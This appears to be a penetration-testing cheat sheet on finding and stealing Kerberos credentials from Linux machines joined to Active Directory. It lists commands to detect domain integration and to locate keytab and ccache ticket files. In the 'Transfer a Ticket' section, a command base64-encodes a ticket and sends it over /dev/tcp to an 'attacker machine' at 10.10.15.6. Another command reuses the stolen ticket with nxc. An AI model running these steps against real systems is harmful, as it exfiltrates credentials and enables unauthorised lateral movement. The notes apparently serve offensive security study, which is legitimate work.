Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.
## Identifying Linux and Active Directory integration
```
realm list
```
## PS - Check if Linux machine is domain-joined
In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as ==sssd or winbind.== 
```
ps -ef | grep -i "winbind\|sssd"
```
## Finding Kerberos tickets in Linux
On Linux domain-joined machines, we want to find Kerberos tickets to gain more access.
### Using Find to search for files with keytab in the name
```
find / -name *keytab* -ls 2>/dev/null
```
We can also find KeyTab files in automated scripts configured using a cronjob or any other linux service.
```
crontab -l
```
## Finding ccache files
```
env | grep -i krb5
```

##  Transfer a Ticket
First base64 encode the ticket and send it to attacker machine.
```
base64 /tmp/.cache/krb5cc.18494 > /dev/tcp/10.10.15.6/8088
```
### Use the Kerberos ticket with NXC
```
nxc smb IP --use-kcache
```

